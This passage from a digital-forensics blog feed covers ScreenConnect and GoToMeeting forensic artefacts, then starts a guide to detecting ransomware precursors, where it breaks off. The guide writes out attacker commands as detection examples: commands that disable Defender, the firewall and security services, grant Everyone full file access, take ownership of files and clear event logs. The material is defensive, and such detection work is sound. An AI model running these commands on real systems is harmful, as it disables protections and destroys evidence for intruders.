<p>Running an arbitrary exe on the client was trivial via the web UI. I was given the option to run elevated. At this time, a folder was created and my exe file was placed into it: <code>C:\Users\REM\Documents\ConnectWiseControl\Temp\evil.exe</code>. The file executed about a minute later. I killed the process, and the file disappeared from the folder shortly thereafter. Shortly after that, the "Temp" folder also vanished.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><span style="text-decoration: underline">Sending a file</span> to the client was performed via the host software. This activity created a new folder: C:\Users\REM\Documents\ConnectWiseControl\<strong>Files </strong>containing my file.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>Additionally, the event was recorded in the Application log of the client device.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-15.png?w=1024" alt="" class="wp-image-500" style="width:595px;height:375px" width="595" height="375"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>When pulling a file/folder from my victim machine, no event log entries were observed, but changes were observed in the config file found at C:\Users\REM\AppData\Local\ScreenConnect Client (429d9ba6e9123fb4)\user.config. This file appears to change quite a lot during active sessions.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-12.png?w=1024" alt="" class="wp-image-487" style="width:698px;height:108px" width="698" height="108"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>During my test to pull an entire folder,  the current (at the time) version of the file showed the following; telling us which folder was exfiltrated.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-13.png?w=1024" alt="" class="wp-image-494" style="width:791px;height:161px" width="791" height="161"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>It is unfortunate that the file is so volatile since it holds important evidence that I couldn't find elsewhere. Timestamp correlation with shellbags or carving the user.config files from disk and/or memory could be good next steps to find out which files/folders were taken.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><strong>Remote Administration</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>Numerous administration tasks are available to the host in the web console, such as:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<ul>
</p>
<li>list/kill tasks</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>list/manage services</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>list/manage "updates"</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Review a selection of event logs. </li>
<p><!-- /wp:list-item -->
</ul>
<p><!-- /wp:list --></p>
<p></p>
<p>My testing showed that  each of these is accomplished through randomly named ps1 files which are executed with PowerShell as a child process of ScreenConnect.ClientService.exe as follows: </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<pre class="wp-block-code"><code><em>powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -File C:\WINDOWS\TEMP\ScreenConnect\23.4.5.8571\f5955c63-3955-4c4a-ba98-672d4d6291eerun.ps1</em></code></pre>
<p><!-- /wp:code --></p>
<p></p>
<p>With script block logging and PowerShell transcripts, we can see what information is being leaked to the host and what other actions were taken.  </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>The ps1 launched by the "Updates" query left the following 4104 event in the powershell (Operational)  log. A review of any other 4104 events where the path includes "ScreenConnect" would answer additional remaining questions about these sorts of remote admin diagnostic tasks.  </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-9.png?w=1024" alt="" class="wp-image-480" style="width:588px;height:241px" width="588" height="241"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>It's nice to know what <strong>kinds </strong>of data we may have lost to the attacker, but in the case of vulnerabilities, we might want to know the exact data that was spilled.  EventID 4103 and/or our PowerShell transcripts will tell us that story. Here's a sample of the transcript file for the "Updates" query which shows that the host is now aware I haven't patched this client machine since 2018! Additional samples can be found here:<a href="https://github.com/dfirtnt/Testing_Artifacts#:~:text=PowerShell_transcripts.zip"> psh_trasnscript_samples</a></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-11.png?w=1024" alt="" class="wp-image-484" style="width:431px;height:263px" width="431" height="263"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p><strong>A Summary of Indicators / TTPs</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>
<strong>TTP</strong> <strong>/ IOCs</strong>
</td>
<td><strong>Analytic</strong></td>
</tr>
<tr>
<td>Screenconnect service installed with a part of the name being randomly generated: "ScreenConnect Client (429d9ba6e9123fb4)"</td>
<td>source=system.evtx EventCode=7045<br>Message = "*ScreenConnect Cient (*)"<br>
</td>
</tr>
<tr>
<td>The service running as SYSTEM was also recorded in a 4573 event in the Security Log indicating Sensitive Privilege Use (SeTcbPrivilege)</td>
<td>source=system.evtx EventCode=4573<br>Message = "*<em>ScreenConnect*</em>" AND Message = "*SeTcbPrivilege*"</td>
</tr>
<tr>
<td>https://amskatoff.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&amp;y=Guest</td>
<td>Review EDR/Sysmon commandlines, DNS events, and/or, Proxy Logs for URLs with pattern like:<br><br>http*.screenconnect.com/<br>Bin/ScreenConnect*.exe*</td>
</tr>
<tr>
<td>ScreenConnect.ClientService.exe</td>
<td>Filename indicator for use in reviewing process execution events.</td>
</tr>
<tr>
<td>ScreenConnect.WindowsClient.exe </td>
<td>Filename indicator for use in reviewing process execution events.</td>
</tr>
<tr>
<td>Cloud Account Administrator Connected</td>
<td>source=Application.evtx<br>EventCode=100<br>Source=ScreenConnect<br>Message="*Cloud Account Administrator Connected*"</td>
</tr>
<tr>
<td>Cloud Account Administrator Disconnected</td>
<td>source=Application.evtx<br>EventCode=101<br>Source=ScreenConnect<br>Message="<em>Cloud Account Administrator Disconnected</em>"</td>
</tr>
<tr>
<td>C:\Users\REM\Documents\ConnectWiseControl\<strong>Temp</strong>
</td>
<td>Execution of any PE from this directory indicates it was likely provided by the ScreenConnect host.</td>
</tr>
<tr>
<td>C:\Users\REM\Documents\ConnectWiseControl\<strong>Files</strong>
</td>
<td>source=Application.evtx<br>EventCode=201<br>Source=ScreenConnect<br>Message="*transfer*"</td>
</tr>
<tr>
<td><em>powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -File C:\WINDOWS\TEMP\ScreenConnect\23.4.5.8571\f5955c63-3955-4c4a-ba98-672d4d6291eerun.ps1</em></td>
<td>Source=Microsoft-Windows-Powershell-Operational<br>EventID 4103<br>Message=*screenConnect*.ps1*<br>
</td>
</tr>
</tbody>
</table>
<figcaption class="wp-element-caption">Huntables</figcaption>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p><strong>Additional Resources</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>Although this research was independent, after I started it, I noticed several other excellent resources online with similar information. If you want to delve deeper, check them out:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<ul>
</p>
<li><a href="https://www.huntandhackett.com/blog/revil-the-usage-of-legitimate-remote-admin-tooling">https://www.huntandhackett.com/blog/revil-the-usage-of-legitimate-remote-admin-tooling</a></li>
<p><!-- /wp:list-item -->
</ul>
<p><!-- /wp:list --></p>
<p></p>
<ul>
</p>
<li><a href="https://digitalforensicsdotblog.wordpress.com/tag/screenconnect/">https://digitalforensicsdotblog.wordpress.com/tag/screenconnect/</a></li>
<p><!-- /wp:list-item -->
</ul>
<p><!-- /wp:list --><br />
</body></html></p>]]></content><author><name>Andrew Skatoff</name></author><category term="Forensics" /><category term="Log Analysis" /><category term="RMM" /><summary type="html"><![CDATA[- LOL_M&amp;Ms Inspired by recent threat intelligence, I am starting a series on Remote Monitoring and Management (RMM) tools. I wanted start with some testing on ScreenConnect to support investigators who may have a victim device where a user has been tricked into giving control over to an attacker. We want to be able to answer questions like these: What can we find out about what happened? Was malware introduced? Was sensitive data lost? Here is some obligatory background nonsense from JetPack AI: ScreenConnect is a comprehensive remote access tool developed by ConnectWise. With its robust capabilities, ScreenConnect empowers users to securely and conveniently access and control remote computers, servers, and devices from anywhere in the world. Designed with simplicity and efficiency in mind, ScreenConnect facilitates seamless collaboration, troubleshooting, and support for IT professionals and businesses alike. Whether you need to assist a colleague, provide remote technical support, or access your work computer while on the go, ScreenConnect offers a reliable solution that ensures a seamless and secure remote access experience. Testing Details Testing was done with ScreenConnect agent version 23.4.5.8571 with the "victim" device being Windows10 v1709 (OS Build 16299.309). Telemetry used was Sysmon (with the Swift-on-Security config), PowerShell script block logging and transcripts were enabled. Noriben was used to automate Procmon output. Memory strings analysis performed with ProcessHacker. Installation After signing up for a 14-day free trial and setting up my account, they gave me a custom URL to sign into a web UI where I could manage my fleet of "victim" devices. I was able to create my own subdomain like so: "amskatoff.screenconnect.com". Web UI console to manage my fleet After clicking on the "Build+" button (located at the top left corner), I was prompted to build an installer and given several options for the target operating system. This was followed by options to download the executable file or share a link to it. The provided link was: https://amskatoff.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&amp;y=Guest Once executed, the installer launched msiexec.exe and installed a service called "ScreenConnect Client (429d9ba6e9123fb4)" which pointed to C:\Program Files (x86)\ScreenConnect Client (429d9ba6e9123fb4)\ScreenConnect.ClientService.exe. This file then spawned two instances of a child process called ScreenConnect.WindowsClient.exe one with my default credentials and another one running as System. The service running as SYSTEM was also recorded in a 4573 event in the Security Log, indicating sensitive privilege use (SeTcbPrivilege). The remote control session was immediately available through the host web interface. There was no prompt to give full control. A telling application log event occurred at this time, showing that I was now connected to the victim's device. A similar event was logged when the remote connection was severed. An apparently randomly generated C2 domain (instance-bw7a3j-relay.screenconnect.com) was contacted over port 443 as part of this channel. Similar domain name patterns have been observed in threat intelligence reports. Chatting I was unable to find any logs of chat messages. However, my chat strings were found in memory. File Transfers Running an arbitrary exe on the client was trivial via the web UI. I was given the option to run elevated. At this time, a folder was created and my exe file was placed into it: C:\Users\REM\Documents\ConnectWiseControl\Temp\evil.exe. The file executed about a minute later. I killed the process, and the file disappeared from the folder shortly thereafter. Shortly after that, the "Temp" folder also vanished. Sending a file to the client was performed via the host software. This activity created a new folder: C:\Users\REM\Documents\ConnectWiseControl\Files containing my file. Additionally, the event was recorded in the Application log of the client device. When pulling a file/folder from my victim machine, no event log entries were observed, but changes were observed in the config file found at C:\Users\REM\AppData\Local\ScreenConnect Client (429d9ba6e9123fb4)\user.config. This file appears to change quite a lot during active sessions. During my test to pull an entire folder, the current (at the time) version of the file showed the following; telling us which folder was exfiltrated. It is unfortunate that the file is so volatile since it holds important evidence that I couldn't find elsewhere. Timestamp correlation with shellbags or carving the user.config files from disk and/or memory could be good next steps to find out which files/folders were taken. Remote Administration Numerous administration tasks are available to the host in the web console, such as: list/kill tasks list/manage services list/manage "updates" Review a selection of event logs. My testing showed that each of these is accomplished through randomly named ps1 files which are executed with PowerShell as a child process of ScreenConnect.ClientService.exe as follows: powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -File C:\WINDOWS\TEMP\ScreenConnect\23.4.5.8571\f5955c63-3955-4c4a-ba98-672d4d6291eerun.ps1 With script block logging and PowerShell transcripts, we can see what information is being leaked to the host and what other actions were taken. The ps1 launched by the "Updates" query left the following 4104 event in the powershell (Operational) log. A review of any other 4104 events where the path includes "ScreenConnect" would answer additional remaining questions about these sorts of remote admin diagnostic tasks. It's nice to know what kinds of data we may have lost to the attacker, but in the case of vulnerabilities, we might want to know the exact data that was spilled. EventID 4103 and/or our PowerShell transcripts will tell us that story. Here's a sample of the transcript file for the "Updates" query which shows that the host is now aware I haven't patched this client machine since 2018! Additional samples can be found here: psh_trasnscript_samples A Summary of Indicators / TTPs TTP / IOCs Analytic Screenconnect service installed with a part of the name being randomly generated: "ScreenConnect Client (429d9ba6e9123fb4)" source=system.evtx EventCode=7045Message = "*ScreenConnect Cient (*)" The service running as SYSTEM was also recorded in a 4573 event in the Security Log indicating Sensitive Privilege Use (SeTcbPrivilege) source=system.evtx EventCode=4573Message = "*ScreenConnect*" AND Message = "*SeTcbPrivilege*" https://amskatoff.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&amp;y=Guest Review EDR/Sysmon commandlines, DNS events, and/or, Proxy Logs for URLs with pattern like:http*.screenconnect.com/Bin/ScreenConnect*.exe* ScreenConnect.ClientService.exe Filename indicator for use in reviewing process execution events. ScreenConnect.WindowsClient.exe Filename indicator for use in reviewing process execution events. Cloud Account Administrator Connected source=Application.evtxEventCode=100Source=ScreenConnectMessage="*Cloud Account Administrator Connected*" Cloud Account Administrator Disconnected source=Application.evtxEventCode=101Source=ScreenConnectMessage="Cloud Account Administrator Disconnected" C:\Users\REM\Documents\ConnectWiseControl\Temp Execution of any PE from this directory indicates it was likely provided by the ScreenConnect host. C:\Users\REM\Documents\ConnectWiseControl\Files source=Application.evtxEventCode=201Source=ScreenConnectMessage="*transfer*" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -File C:\WINDOWS\TEMP\ScreenConnect\23.4.5.8571\f5955c63-3955-4c4a-ba98-672d4d6291eerun.ps1 Source=Microsoft-Windows-Powershell-OperationalEventID 4103Message=*screenConnect*.ps1* Huntables Additional Resources Although this research was independent, after I started it, I noticed several other excellent resources online with similar information. If you want to delve deeper, check them out: https://www.huntandhackett.com/blog/revil-the-usage-of-legitimate-remote-admin-tooling https://digitalforensicsdotblog.wordpress.com/tag/screenconnect/]]></summary></entry><entry><title type="html">GoToForensics</title><link href="https://dfirtnt.github.io/2023/03/27/gotoforensics/" rel="alternate" type="text/html" title="GoToForensics" /><published>2023-03-27T19:45:05-04:00</published><updated>2023-03-27T19:45:05-04:00</updated><id>https://dfirtnt.github.io/2023/03/27/gotoforensics</id><content type="html" xml:base="https://dfirtnt.github.io/2023/03/27/gotoforensics/"><![CDATA[- LOL_M&amp;Ms
- RMM
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd"><br />
<html><body></p>
<p>In this post we will share findings from testing GoToMeeting software when used to chat, share screens and give control of your screen to other participants. Special credits to <a rel="noreferrer noopener" href="https://twitter.com/gamaquifor" target="_blank">Gabriel Quiroz</a> for performing a substantial amount of this testing, as well as validating  many of my findings. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>GoTo has numerous products, one of which was formerly known as LogMeIn and is now known as GoToMeeting. The scope of this testing was limited to GoToMeeting (aka G2M). The scope is further limited to the downloadable software and does not include hosting meetings via a web browser.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>Testing was conducted on a Windows 10 21H2 as the meeting host and using the 3.34.0.1 version of the GoToMeeting software. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<div class="wp-block-columns">
</p>
<div class="wp-block-column" style="flex-basis:100%">
</p>
<figure class="wp-block-table">
<table>
<thead>
<tr>
<th><strong>Action</strong></th>
<th><strong>Evidence</strong></th>
<th><strong>Analysis</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>GoToMeeting Launched</td>
<td>Command line string "GoTo.exe" which also include the words "--type=crashpad-handler". This is evidence of the Chromium-based GoTo.exe starting to join or host a meeting. Some versions below 3.34.0.1 were not Chromium based.</td>
<td>A high frequency of occurrence could be indicative of a user outsourcing their job. Additional evidence needed to verify. </td>
</tr>
<tr>
<td>GoToMeeting Meeting Started by Host</td>
<td>Command line strings "g2mstart.exe" or "GoTo.exe" or "g2mcomm.exe" which also include the words "Action" AND "Host"</td>
<td>A high frequency of occurrence could be indicative of a user outsourcing their job. Additional evidence needed to verify. </td>
</tr>
<tr>
<td>G2M Screen Sharing</td>
<td>Command line strings "GoToScrUtils.exe" or "g2mui.exe"  or "G2MScrUtil64.exe"  which also include the string "/cr". Based on our testing, this indicates GoTo is being used to share a screen. </td>
<td>Screen sharing via G2M may or may not be authorized in your organization. If authorized, frequent/daily screen sharing may represent an insider risk.</td>
</tr>
<tr>
<td>Guest WebCam Turned On</td>
<td>The goto.log file will indicate another participant turns on their webcam with a line similar to:<br><br>[2023-02-28T21:55:57.659Z -05:00] [info]  [context] me_numberOfWebcamsReceived= 1</td>
<td>The number will increment as additional participants turn on their cameras.</td>
</tr>
<tr>
<td>Remote Control</td>
<td>GoTo logs most important events in the users AppData  folder as follows:<br><br> "C:\Users\\AppData\Roaming\GoTo\Logs\goto.log"  OR<br> "C:\Users\\AppData\Roaming\GoTo\Logs\goto.old.log". <br><br>
</td>
<td>Search for strings referencing the keyword "remoteControl"<br><br><a href="https://dfirtnt.wordpress.com/wp-content/uploads/2023/03/g2mremotcontrol.jpg"><img style="width: 900px" src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/03/g2mremotcontrol-1.jpg" alt=""></a>
</td>
</tr>
<tr>
<td>3rd Party joining the session</td>
<td>GoToMeeting indicates the number of attendees on a meeting. Use string search to search for the number of attendees joining the session.</td>
<td>Correlate the timestamp observed in the evidence of remote control to the evidence of an increase in the number of attendees. A sample showing the increase in the number of attendees is shown below.<br><br><a href="https://dfirtnt.wordpress.com/wp-content/uploads/2023/03/g2mattendeecount.jpg"><img class="wp-image-419" style="width: 500px" src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/03/g2mattendeecount.jpg" alt=""></a>
</td>
</tr>
<tr>
<td>External Participants</td>
<td>The goto.log file can be searched for "displayName" to determine the identity of the meeting participants. <br><br>
</td>
<td>The "dialDirection":"In" signifies the participant is not the host. <br><br><a href="https://dfirtnt.wordpress.com/wp-content/uploads/2023/03/g2mparticipantid.jpg"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/03/g2mparticipantid.jpg" alt=""></a>
</td>
</tr>
<tr>
<td>GoToMeeting Recordings</td>
<td>Testing has shown GoToMeeting recordings will be written to User's default Documents folder as *.webm files. <br><br><a href="https://dfirtnt.wordpress.com/wp-content/uploads/2023/03/g2mwbemfiles.jpg"><img class="wp-image-423" style="width: 400px" src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/03/g2mwbemfiles.jpg" alt=""></a>
</td>
<td>These can be played with windows media player. If meeting was viewed by an untrusted party, data leakage may have occurred. Review the videos to assess.<br><br>The timestamp in the filename indicates the local time the recording began. The file "last modified" time is roughly when the recording ended.</td>
</tr>
<tr>
<td>GoToMeeting Cloud Recordings</td>
<td>1. Alternatively, if cloud based recordings are used, the goto.log file will contain the string "cloud-based recording"<br><br><a href="https://dfirtnt.wordpress.com/wp-content/uploads/2023/03/g2mcloudbasedrec.jpg"><img class="wp-image-424" style="width: 400px" src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/03/g2mcloudbasedrec.jpg" alt=""></a><br><br>2. Additionally, an email will be sent to the host user with subject like <em>"Your interactive recording is ready!"</em><br><br>3. Further, the email will contain a link to the recording with a URL starting with https://transcripts.gotomeeting.com.  </td>
<td>1. Examiner should seek to view these videos for further evidence, especially relating to data loss to an untrusted meeting participant and/or GoToMeeting cloud.<br><br>2. Email logs can be search for this subject.<br><br>3. Proxy logs can be reviewed for visits to this domain. </td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table -->
</div>
<p><!-- /wp:column -->
</div>
<p><!-- /wp:columns --><br />
</body></html></p>]]></content><author><name>Andrew Skatoff</name></author><category term="Forensics" /><category term="Log Analysis" /><summary type="html"><![CDATA[- LOL_M&amp;Ms - RMM In this post we will share findings from testing GoToMeeting software when used to chat, share screens and give control of your screen to other participants. Special credits to Gabriel Quiroz for performing a substantial amount of this testing, as well as validating many of my findings. GoTo has numerous products, one of which was formerly known as LogMeIn and is now known as GoToMeeting. The scope of this testing was limited to GoToMeeting (aka G2M). The scope is further limited to the downloadable software and does not include hosting meetings via a web browser. Testing was conducted on a Windows 10 21H2 as the meeting host and using the 3.34.0.1 version of the GoToMeeting software. Action Evidence Analysis GoToMeeting Launched Command line string "GoTo.exe" which also include the words "--type=crashpad-handler". This is evidence of the Chromium-based GoTo.exe starting to join or host a meeting. Some versions below 3.34.0.1 were not Chromium based. A high frequency of occurrence could be indicative of a user outsourcing their job. Additional evidence needed to verify. GoToMeeting Meeting Started by Host Command line strings "g2mstart.exe" or "GoTo.exe" or "g2mcomm.exe" which also include the words "Action" AND "Host" A high frequency of occurrence could be indicative of a user outsourcing their job. Additional evidence needed to verify. G2M Screen Sharing Command line strings "GoToScrUtils.exe" or "g2mui.exe"  or "G2MScrUtil64.exe"  which also include the string "/cr". Based on our testing, this indicates GoTo is being used to share a screen.  Screen sharing via G2M may or may not be authorized in your organization. If authorized, frequent/daily screen sharing may represent an insider risk. Guest WebCam Turned On The goto.log file will indicate another participant turns on their webcam with a line similar to:[2023-02-28T21:55:57.659Z -05:00] [info]  [context] me_numberOfWebcamsReceived= 1 The number will increment as additional participants turn on their cameras. Remote Control GoTo logs most important events in the users AppData folder as follows: "C:\Users\\AppData\Roaming\GoTo\Logs\goto.log" OR "C:\Users\\AppData\Roaming\GoTo\Logs\goto.old.log". Search for strings referencing the keyword "remoteControl" 3rd Party joining the session GoToMeeting indicates the number of attendees on a meeting. Use string search to search for the number of attendees joining the session. Correlate the timestamp observed in the evidence of remote control to the evidence of an increase in the number of attendees. A sample showing the increase in the number of attendees is shown below. External Participants The goto.log file can be searched for "displayName" to determine the identity of the meeting participants. The "dialDirection":"In" signifies the participant is not the host. GoToMeeting Recordings Testing has shown GoToMeeting recordings will be written to User's default Documents folder as *.webm files. These can be played with windows media player. If meeting was viewed by an untrusted party, data leakage may have occurred. Review the videos to assess.The timestamp in the filename indicates the local time the recording began. The file "last modified" time is roughly when the recording ended. GoToMeeting Cloud Recordings 1. Alternatively, if cloud based recordings are used, the goto.log file will contain the string "cloud-based recording"2. Additionally, an email will be sent to the host user with subject like "Your interactive recording is ready!"3. Further, the email will contain a link to the recording with a URL starting with https://transcripts.gotomeeting.com. 1. Examiner should seek to view these videos for further evidence, especially relating to data loss to an untrusted meeting participant and/or GoToMeeting cloud.2. Email logs can be search for this subject.3. Proxy logs can be reviewed for visits to this domain.]]></summary></entry><entry><title type="html">Detecting Ransomware Precursors</title><link href="https://dfirtnt.github.io/2020/11/25/detecting-ransomware-precursors/" rel="alternate" type="text/html" title="Detecting Ransomware Precursors" /><published>2020-11-25T16:45:00-05:00</published><updated>2020-11-25T16:45:00-05:00</updated><id>https://dfirtnt.github.io/2020/11/25/detecting-ransomware-precursors</id><content type="html" xml:base="https://dfirtnt.github.io/2020/11/25/detecting-ransomware-precursors/"><![CDATA[- Detection
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd"><br />
<html><body></p>
<p>The business model for Ransomware has evolved to include multi-level and multi-stage services and tool kits. Initial access is often accomplished by 1st stage compromise, followed by 2nd stage download/drop of tools like Emotet, Trickbot, and Qakbot. This 2nd stage allows adversaries to lurk in your network, profiling normal use and/or searching for targets of maximum impact. At this point the attack often looks like any other infiltration. However, several techniques are often observed just prior to ransomware execution. In this post I'll provide examples of these detectable behaviors which you can use to build SIEM alerts, custom EDR prevention/response rules, and threat hunting logic. Detecting these patterns (in near real time) will give you an advantage in understanding what kind of threat you are facing and which devices have been impacted when the inevitable emergency phone calls start coming in.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><span style="text-decoration:underline;">Caveat 1:</span> Alerting on this activity is a LAST line of defense. Truthfully, if you catch a real bad guy with these, you're likely going to have a terrible couple of weeks. If you don't already have a robust set of other detection rules for the 1st and 2nd stages, PLEASE don't start here. This is the last chance to alert and will most likely be only of forensic value, since these often occur minutes before ransomware is deployed. If you're lucky, you'll have a chance to identify and isolate the impacted devices before the attack spreads further.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><span style="text-decoration:underline;">Caveat 2</span>: The commands below assume two things: <br>1. you are monitoring process execution and associated command lines, <br>2. the commands are in plain text and not encoded via PowerShell or otherwise obscured (e.g. passed via API). If they are, and you have a robust EDR Solution, or script block logging enabled, you may still be able to see the decoded/hidden commands. Note, some of these techniques are detectable via other means (e.g. registry monitoring) and where that is the case I've mentioned it in the "notes" column below. Always test your rules with adversary emulation techniques!</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><br><strong>Goal 1: Profile and Disable Protections</strong><br>These actions aim to evade/disable prevention/detection tools. This could be disabling AntiVirus processes or making changes to system settings.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<div class="wp-block-columns alignfull are-vertically-aligned-center">
</p>
<div class="wp-block-column is-vertically-aligned-center" style="flex-basis:100%;">
</p>
<figure class="wp-block-table alignfull is-style-stripes">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>SubGoal</strong></td>
<td><strong>Notional Search Logic</strong></td>
<td><strong>Examples</strong></td>
<td><strong>Notes</strong></td>
</tr>
<tr>
<td>Recon for security tools via WMI</td>
<td><code>select * AntivirusProduct<br><br>OR <br><br>select * AntispywareProduct<br><br>OR<br><br>select * FirewallProduct</code></td>
<td><code>wmic select * antivirus<br>wmic select * antispyware<br></code></td>
<td>'*' in these commands is literal. In every other example which follows, it is NOT literal.<br><br>wmic.exe is commonly used, but a few alternative processes are worth including: <br><code>srccons.exe | cmd.exe |<br>winrm.exe | winrs.exe | <br>wmiprvse.exe | cscript.exe| <br>wscript.exe | powershell.exe.  </code>
</td>
</tr>
<tr>
<td>Disable security tools via service stop/delete/config</td>
<td>
<code>net stop *<br><br>OR<br><br>sc stop *<br><br>OR<br><br>sc delete *<br><br>OR<br><br>sc config * disabled</code><br><br>
</td>
<td>Examples for MS Firewall service, MS Defender, and Windows Update Service:<br><code><br>sc config MpsSvc start= disabled<br>sc config WinDefend start= disabled<br>sc config wuauserv start= disabled<br><br>net stop MpsSvc<br>net stop WinDefend<br>net stop wuauserv<br><br>sc stop MpsSvc<br>sc stop WinDefend<br>sc stop wuauserv<br><br>sc delete MpsSvc<br>sc delete WinDefend<br>sc delete wuauserv</code>
</td>
<td>
<br><br>Design your search logic with your own relevant tools and processes unique to your environment.<br><br><a href="https://www.zscaler.com/blogs/security-research/recent-bulehero-botnet-payload" target="_blank" rel="noreferrer noopener">https://www.zscaler.com/blogs/security-research/recent-bulehero-botnet-payload</a><br><br><span style="text-decoration:underline;">Additional Detections:</span><br>7036 – Service started or stopped<br>7040 – Start type changed (Boot | On Request | Disabled)</td>
</tr>
<tr>
<td>Disable windows firewall via netsh</td>
<td><code>netsh firewall set opmode mode=disable<br><br>OR<br><br>netsh Advfirewall set allprofiles state off<br></code></td>
<td><code>cmd /c netsh firewall set opmode mode=disable<br>cmd /c netsh Advfirewall set allprofiles state off</code></td>
<td>Disabling firewalls may assists with lateral movement and C2.<br><br><a href="https://www.zscaler.com/blogs/security-research/recent-bulehero-botnet-payload" target="_blank" rel="noreferrer noopener">https://www.zscaler.com/blogs/security-research/recent-bulehero-botnet-payload</a>
</td>
</tr>
<tr>
<td>Disable or misconfigure Defender AV via powershell</td>
<td><code>powershell Set-MpPreference -Disable*<br><br>OR<br><br>powershell Add-MpPreference -Exclusion*</code></td>
<td><sup>powershell Set-MpPreference -DisableRealtimeMonitoring $true<code><br><br></code>powershell Set-MpPreference -DisableBehaviorMonitoring $true<br><br>powershell Set-MpPreference -DisableRealtimeMonitoring $true<br><br>powershell Add-MpPreference -ExclusionPath C:<br><br>Add-MpPreference -ExclusionExtension ".exe"</sup></td>
<td>These commands disable elements of MS Defender or set exclusion parameters to evade detection.<br><br>Microsoft-Windows-Windows Defender/Operational.evtx<br><br>- Event ID 5001 may be monitored to detect Defender AV Real-Time being disabled.<br><br>- Event ID 5007 may be monitored to detect Defender configuration changes.<br><br>Monitoring this registry key will also help with detection: <br><code>HKLM\SOFTWARE\Microsoft\Windows\Defender\Exclusions</code><br><br><a rel="noreferrer noopener" href="https://www.gdatasoftware.com/blog/2020/11/36459-babax-stealer-rebrands-to-osno-installs-rootkit" target="_blank">https://www.gdatasoftware.com/blog/2020/11/36459-babax-stealer-rebrands-to-osno-installs-rootkit</a><br><br><a rel="noreferrer noopener" href="https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/" target="_blank">https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/</a>
</td>
</tr>
<tr>
<td>Stop Services with WMIC</td>
<td>wmic service where * call stopservice</td>
<td>wmic service where "caption like '%%sense%%'" call stopservice</td>
<td>The example command is aimed at disabling the Windows Defender Advanced Threat Protection (EDR) service.</td>
</tr>
<tr>
<td>Relax filesystem ACLs</td>
<td><code>icacls* *grant*</code></td>
<td><code>"icacls ""C:*"" /grant Everyone:F /T /C /Q" <br><br>"icacls ""D:*"" /grant Everyone:F /T /C /Q"</code></td>
<td>Relaxing filesystem ACLs allows the malware to access all files.<br><br><a href="https://redcanary.com/blog/ryuk-ransomware-attack/" target="_blank" rel="noreferrer noopener">https://redcanary.com/blog/ryuk-ransomware-attack/</a>
</td>
</tr>
<tr>
<td>Take ownership of files with takeown.exe</td>
<td><code>takeown.exe * /F *</code></td>
<td>
<code>Takeown /S c:\</code><br><br><code>TAKEOWN /S system /U user /P password /F Myshare*</code>
</td>
<td>Taking ownership of files allows the malware to access all files.<br><br><a href="https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/" target="_blank" rel="noreferrer noopener">https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/</a>
</td>
</tr>
<tr>
<td>Clear event logs to cover tracks.</td>
<td><code>wevtutil* cl *</code></td>
